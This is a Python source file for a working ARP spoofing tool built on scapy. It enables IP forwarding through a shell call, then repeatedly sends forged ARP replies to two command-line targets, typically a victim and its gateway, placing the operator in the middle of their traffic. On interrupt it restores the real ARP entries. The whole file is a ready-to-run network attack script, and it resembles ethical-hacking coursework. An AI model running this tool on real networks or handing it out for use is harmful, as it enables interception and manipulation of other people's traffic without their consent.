import time
import scapy.all as scapy
import optparse
import subprocess


subprocess.call("sysctl net.ipv4.ip_forward=1", shell=True)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target1", dest="target1", help="Target 1 for ARP spoofing.")
    parser.add_option("-g", "--target2", dest="target2", help="Target 2 or Gateway for ARP spoofing.")
    (options, arguments) = parser.parse_args()
    if not options.target1:
        parser.error("[-] Please specify target1 for ARP attack, use --help for more info.")
    elif not options.target2:
        parser.error("[-] Please specify target2 for ARP attack, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()


try:
    sent_packets_count = 0
    while True:
        spoof(options.target1, options.target2)
        spoof(options.target2, options.target1)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Quitting ARP Spoofer. Correcting target ARP...")
    restore(options.target1, options.target2)
    restore(options.target2, options.target1)
